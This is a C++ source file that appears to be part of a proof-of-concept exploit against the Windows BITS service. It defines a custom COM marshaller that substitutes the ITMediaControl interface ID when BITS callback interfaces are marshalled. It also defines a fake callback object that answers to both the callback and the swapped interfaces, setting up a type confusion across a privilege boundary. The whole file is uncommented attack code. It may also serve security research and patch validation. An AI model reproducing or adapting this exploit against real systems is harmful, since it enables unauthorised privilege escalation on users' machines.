#include <bits.h>
#include <bits4_0.h>
#include <stdio.h>
#include <tchar.h>
#include <lm.h>
#include <string>
#include <comdef.h>
#include <winternl.h>
#include <Shlwapi.h>
#include <strsafe.h>
#include <vector>

#pragma comment(lib, "shlwapi.lib")

static bstr_t IIDToBSTR(REFIID riid)
{
	LPOLESTR str;
	bstr_t ret = "Unknown";
	if (SUCCEEDED(StringFromIID(riid, &str)))
	{
		ret = str;
		CoTaskMemFree(str);
	}
	return ret;
}

GUID CLSID_AggStdMarshal2 = { 0x00000027,0x0000,0x0008,{ 0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46 } };
GUID IID_ITMediaControl = { 0xc445dde8,0x5199,0x4bc7,{ 0x98,0x07,0x5f,0xfb,0x92,0xe4,0x2e,0x09 } };


class CMarshaller : public IMarshal
{
	LONG _ref_count;
	IUnknownPtr _unk;

	~CMarshaller() {}

public:

	CMarshaller(IUnknown* unk) : _ref_count(1)
	{
		_unk = unk;
	}

	virtual HRESULT STDMETHODCALLTYPE QueryInterface(
		/* [in] */ REFIID riid,
		/* [iid_is][out] */ _COM_Outptr_ void __RPC_FAR *__RPC_FAR *ppvObject)
	{
		*ppvObject = nullptr;
		printf("QI - Marshaller: %ls %p\n", IIDToBSTR(riid).GetBSTR(), this);

		if (riid == IID_IUnknown)
		{
			*ppvObject = this;
		}
		else if (riid == IID_IMarshal)
		{
			*ppvObject = static_cast<IMarshal*>(this);
		}
		else
		{
			return E_NOINTERFACE;
		}
		printf("Queried Success: %p\n", *ppvObject);
		((IUnknown*)*ppvObject)->AddRef();
		return S_OK;
	}

	virtual ULONG STDMETHODCALLTYPE AddRef(void)
	{
		printf("AddRef: %d\n", _ref_count);
		return InterlockedIncrement(&_ref_count);
	}

	virtual ULONG STDMETHODCALLTYPE Release(void)
	{
		printf("Release: %d\n", _ref_count);
		ULONG ret = InterlockedDecrement(&_ref_count);
		if (ret == 0)
		{
			printf("Release object %p\n", this);
			delete this;
		}
		return ret;
	}

	virtual HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
		/* [annotation][in] */
		_In_  REFIID riid,
		/* [annotation][unique][in] */
		_In_opt_  void *pv,
		/* [annotation][in] */
		_In_  DWORD dwDestContext,
		/* [annotation][unique][in] */
		_Reserved_  void *pvDestContext,
		/* [annotation][in] */
		_In_  DWORD mshlflags,
		/* [annotation][out] */
		_Out_  CLSID *pCid)
	{
		*pCid = CLSID_AggStdMarshal2;
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE GetMarshalSizeMax(
		/* [annotation][in] */
		_In_  REFIID riid,
		/* [annotation][unique][in] */
		_In_opt_  void *pv,
		/* [annotation][in] */
		_In_  DWORD dwDestContext,
		/* [annotation][unique][in] */
		_Reserved_  void *pvDestContext,
		/* [annotation][in] */
		_In_  DWORD mshlflags,
		/* [annotation][out] */
		_Out_  DWORD *pSize)
	{
		*pSize = 1024;
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE MarshalInterface(
		/* [annotation][unique][in] */
		_In_  IStream *pStm,
		/* [annotation][in] */
		_In_  REFIID riid,
		/* [annotation][unique][in] */
		_In_opt_  void *pv,
		/* [annotation][in] */
		_In_  DWORD dwDestContext,
		/* [annotation][unique][in] */
		_Reserved_  void *pvDestContext,
		/* [annotation][in] */
		_In_  DWORD mshlflags)
	{
		printf("Marshal Interface: %ls\n", IIDToBSTR(riid).GetBSTR());
		IID iid = riid;
		if (iid == __uuidof(IBackgroundCopyCallback2) || iid == __uuidof(IBackgroundCopyCallback))
		{
			printf("Setting bad IID\n");
			iid = IID_ITMediaControl;
		}
		HRESULT hr = CoMarshalInterface(pStm, iid, _unk, dwDestContext, pvDestContext, mshlflags);
		printf("Marshal Complete: %08X\n", hr);
		return hr;
	}

	virtual HRESULT STDMETHODCALLTYPE UnmarshalInterface(
		/* [annotation][unique][in] */
		_In_  IStream *pStm,
		/* [annotation][in] */
		_In_  REFIID riid,
		/* [annotation][out] */
		_Outptr_  void **ppv)
	{
		return E_NOTIMPL;
	}

	virtual HRESULT STDMETHODCALLTYPE ReleaseMarshalData(
		/* [annotation][unique][in] */
		_In_  IStream *pStm)
	{
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE DisconnectObject(
		/* [annotation][in] */
		_In_  DWORD dwReserved)
	{
		return S_OK;
	}
};


class FakeObject : public IBackgroundCopyCallback2, public IPersist
{
	LONG m_lRefCount;

	~FakeObject() {};

public:
	//Constructor, Destructor
	FakeObject() {
		m_lRefCount = 1;
	}

	//IUnknown
	HRESULT __stdcall QueryInterface(REFIID riid, LPVOID *ppvObj)
	{
		if (riid == __uuidof(IUnknown))
		{
			printf("Query for IUnknown\n");
			*ppvObj = this;
		}
		else if (riid == __uuidof(IBackgroundCopyCallback2))
		{
			printf("Query for IBackgroundCopyCallback2\n");
			*ppvObj = static_cast<IBackgroundCopyCallback2*>(this);
		}
		else if (riid == __uuidof(IBackgroundCopyCallback))
		{
			printf("Query for IBackgroundCopyCallback\n");
			*ppvObj = static_cast<IBackgroundCopyCallback*>(this);
		}
		else if (riid == __uuidof(IPersist))
		{
			printf("Query for IPersist\n");
			*ppvObj = static_cast<IPersist*>(this);
		}
		else if (riid == IID_ITMediaControl)
		{
			printf("Query for ITMediaControl\n");
			*ppvObj = static_cast<IPersist*>(this);
		}
		else
		{
			printf("Unknown IID: %ls %p\n", IIDToBSTR(riid).GetBSTR(), this);
			*ppvObj = NULL;
			return E_NOINTERFACE;
		}

		((IUnknown*)*ppvObj)->AddRef();
		return NOERROR;
	}

	ULONG __stdcall AddRef()
	{
		return InterlockedIncrement(&m_lRefCount);
	}

	ULONG __stdcall Release()
	{
		ULONG  ulCount = InterlockedDecrement(&m_lRefCount);

		if (0 == ulCount)
		{
			delete this;
		}

		return ulCount;
	}

	virtual HRESULT STDMETHODCALLTYPE JobTransferred(
		/* [in] */ __RPC__in_opt IBackgroundCopyJob *pJob)
	{
		printf("JobTransferred\n");
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE JobError(
		/* [in] */ __RPC__in_opt IBackgroundCopyJob *pJob,
		/* [in] */ __RPC__in_opt IBackgroundCopyError *pError)
	{
		printf("JobError\n");
		return S_OK;
	}


	virtual HRESULT STDMETHODCALLTYPE JobModification(
		/* [in] */ __RPC__in_opt IBackgroundCopyJob *pJob,
		/* [in] */ DWORD dwReserved)
	{
		printf("JobModification\n");
		return S_OK;
	}


	virtual HRESULT STDMETHODCALLTYPE FileTransferred(
		/* [in] */ __RPC__in_opt IBackgroundCopyJob *pJob,
		/* [in] */ __RPC__in_opt IBackgroundCopyFile *pFile)
	{
		printf("FileTransferred\n");
		return S_OK;
	}

	virtual HRESULT STDMETHODCALLTYPE GetClassID(
		/* [out] */ __RPC__out CLSID *pClassID)
	{
		*pClassID = GUID_NULL;
		return S_OK;
	}
};